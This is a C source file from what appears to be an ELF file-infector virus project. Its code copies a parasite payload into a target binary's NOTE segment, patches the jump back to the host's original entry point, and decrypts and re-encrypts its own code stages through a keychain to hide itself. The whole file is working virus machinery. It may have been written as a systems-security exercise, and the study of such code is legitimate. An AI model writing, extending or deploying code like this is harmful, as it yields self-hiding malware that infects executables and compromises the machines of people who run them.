#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void insert_parasite(char *dst, Elf64_Phdr **segment)
{
	_memcpy(dst + segment[NOTE]->p_offset, __entry, segment[NOTE]->p_filesz);
}

__attribute__((always_inline)) static inline void patch_entry_point(char *dst, const struct s_host *host)
{
	size_t offset = JUMP_SIZE;

	dst += host->segment[NOTE]->p_offset + ((void *)execution - (void *)__entry);

	while (true)
	{
		if (*(unsigned char *)dst == 0xe9)
		{
			dst++;
			offset++;
			break;
		}
		offset++;
		dst++;
	}

	const size_t entry_point = host->entry[OLD] - (host->segment[NOTE]->p_vaddr + (((void *)execution + offset) - (void *)__entry));

	_memcpy(dst, &entry_point, sizeof(int));
}


////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void parasite(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_infect *infect)
{
#if LOGGER
	MID_LOGGER("parasite:\t\t");
#endif

	decrypt_right(keychain, (char *)injection, (void *)parasite - (void *)injection);

	if (context == FAILURE)
		goto label;

	char *ptr = infect->ptr + (host->segment[NOTE]->p_offset + ((void *)parasite - (void *)__entry));

	insert_parasite(infect->ptr, host->segment);
	patch_entry_point(infect->ptr, host);

	decrypt_left(keychain, ptr, (void *)stub - (void *)parasite);

label:
	update_keychain_right(keychain, (char *)parasite, (void *)stub - (void *)parasite);
	decrypt_right(keychain, (char *)stub, (void *)sign - (void *)stub);

	stub(host, keychain, context, infect);
}
